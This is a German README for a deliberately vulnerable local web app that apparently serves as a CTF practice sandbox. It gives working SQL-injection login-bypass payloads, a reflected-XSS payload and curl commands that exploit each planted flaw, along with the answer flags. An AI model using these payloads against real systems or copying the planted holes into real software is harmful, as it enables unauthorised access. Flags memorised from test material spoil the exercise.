# vuln-web

Kleines, **absichtlich verwundbares** Web-Testziel für einen CTF-Probelauf.
Reines Python 3.13 stdlib (`http.server`), eine SQLite-Datei, startbar mit einem Befehl.

> ⚠️ Nur lokal betreiben. Der Server bindet bewusst nur an `127.0.0.1`.
> Nicht ins Netz stellen, nicht als Vorlage für echten Code nehmen.
>
> ℹ️ Rolle im ctf-ops-Setup: Dies ist die **eigene** App (`own_instance`), die wir
> *verteidigen* und als **Verify-/Preflight-Sandbox** für PoCs nutzen — **nicht** das
> Angriffsziel. Angegriffen werden nur die Gegner-Instanzen aus `config/targets.toml`.

## Starten

```
cd vuln-web
python app.py            # Standardport 8000
python app.py 8080       # eigener Port
```

Beim ersten Start wird `vuln-web.db` neben `app.py` angelegt und mit Testdaten
befüllt. Stoppen mit `Strg+C`. Für einen sauberen Neustart einfach die Datei
`vuln-web.db` löschen.

Erreichbar danach unter `http://127.0.0.1:8000/`.

## Routen

| Route | Methode | Zweck |
|-------|---------|-------|
| `/`              | GET  | Startseite |
| `/search?q=`     | GET  | Produktsuche – **sicher** (parametrisiert, zum Kontrast) |
| `/hello?name=`   | GET  | Begrüßung – Reflected XSS |
| `/login`         | GET/POST | Login – SQL-Injection |
| `/admin`         | GET  | Admin-Panel – fehlender Zugriffsschutz |

## Die drei Schwachstellen und ihre Flags

Jede Flag ist in der SQLite-Datei (`secrets`-Tabelle) hinterlegt und wird nur
auf dem jeweiligen Ausnutzungspfad ausgeliefert.

### 1. SQL-Injection (Login) → `FLAG{sqli-login-bypass-7Qk2pL}`

`route_login_submit` baut die Abfrage per String-Verkettung
([app.py](app.py) – Suchbegriff „`WHERE username =`"). Auth-Bypass als Admin:

- Benutzername: `admin' --`  (Passwort beliebig), oder
- Benutzername: `' OR role='admin' --`  (Passwort beliebig)

Per `curl`:

```
curl -s -X POST http://127.0.0.1:8000/login \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=x"
```

Bei erfolgreichem Admin-Login steht die Flag in der Antwort.

### 2. Fehlender Zugriffsschutz (Admin) → `FLAG{broken-access-admin-9Lm5xR}`

`route_admin` liest zwar ein `session`-Cookie, erzwingt aber keine Rolle –
jeder direkte Aufruf bekommt das Panel samt Flag:

```
curl -s http://127.0.0.1:8000/admin
```

### 3. Reflected XSS (Begrüßung) → `FLAG{reflected-xss-3Zt8wN}`

`route_hello` schreibt den `name`-Parameter ungeescaped in die Antwort. Sobald
die Eingabe aktives Markup enthält (ein `<`), gilt die Injektion als gelungen
und die Flag wird mit ausgeliefert (als HTML-Kommentar) – so ist der Testlauf
auch headless prüfbar:

```
curl -s "http://127.0.0.1:8000/hello?name=<script>alert(1)</script>"
```

Die Flag erscheint im Quelltext der Antwort. Harmlose Eingaben (ohne `<`)
geben keine Flag zurück.

## Flag-Varianten (nur Test) → `/variant`

Zum Prüfen der **zentralen Flag-Extraktion** liefert `/variant` denselben
Zusatz-Flag `FLAG{hidden-variant-Qw9zY4}` an bewusst *versteckten* Stellen aus.
Der Flag liegt in einer eigenen `secrets`-Zeile (`variant`) – also einer anderen
Quelle/„Spalte" als die drei bekannten. Die drei klassischen Lücken und ihre
Pfade bleiben davon unberührt (Happy Path bleibt grün).

| Aufruf | Wo steckt der Flag |
|--------|--------------------|
| `/variant?kind=header`  | Response-Header `X-CTF-Flag` (nicht im Body) |
| `/variant?kind=cookie`  | `Set-Cookie`-Header (nicht im Body) |
| `/variant?kind=base64`  | base64-kodiert im Body-Kommentar |
| `/variant?kind=json`    | Klartext nested im JSON (`data.meta.token`) |
| `/variant?kind=b64json` | base64-kodiert nested im JSON (`data.blob`) |

Eine reine Body-Klartext-Suche findet header/cookie/base64 **nicht**; eine
Extraktion über Body **+ Header + Dekodierung** zieht alle fünf. `verify.py`
prüft sie zusätzlich zum Happy Path.

## Für den Code-Audit

Der Quelltext steht komplett in [app.py](app.py) und ist bewusst gut lesbar
gehalten. Zum Vergleich ist **eine** Stelle korrekt gelöst: `/search` nutzt eine
parametrisierte Abfrage und escaped seine Ausgabe – ein sauberes Gegenbeispiel
zu den drei Lücken.

## Schnelle Verifikation aller drei Flags

```
BASE=http://127.0.0.1:8000
curl -s -X POST $BASE/login --data-urlencode "username=admin' --" --data-urlencode "password=x" | grep -o 'FLAG{[^}]*}'
curl -s $BASE/admin | grep -o 'FLAG{[^}]*}'
curl -s "$BASE/hello?name=<b>x</b>" | grep -o 'FLAG{[^}]*}'
```

Drei Treffer → Probelauf grün.
